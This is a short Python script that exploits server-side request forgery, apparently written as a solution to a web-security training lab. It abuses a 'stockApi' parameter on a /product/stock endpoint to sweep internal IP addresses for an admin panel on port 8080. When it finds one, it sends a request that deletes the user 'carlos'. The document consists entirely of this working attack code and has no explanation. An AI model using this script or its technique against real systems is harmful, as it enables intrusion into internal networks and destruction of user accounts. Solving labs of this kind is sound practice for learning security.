import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-u', dest='URL', help='URL')
parser.add_argument('-i', dest='IP', help='IP')
args = parser.parse_args()

url = args.URL
ip = args.IP
stock_url = url+"/product/stock"

s = requests.Session()
s.get(url)
def post(num, ip):
	ip = f"{ip[:10]}{num}"
	stockApi = f"http://{ip}:8080/admin"
	parameters = {"stockApi": stockApi}
	r = s.post(stock_url, data=parameters)
	if "Admin panel" in r.text:
		stockApi = f"http://{ip}:8080/admin/delete?username=carlos"
		parameters = {"stockApi": stockApi}
		r = s.post(stock_url, data=parameters)
		print("Carlos Deleted")
		exit()
	print(f"{stockApi}: {r}")

for i in range(1,256):
	post(i, ip)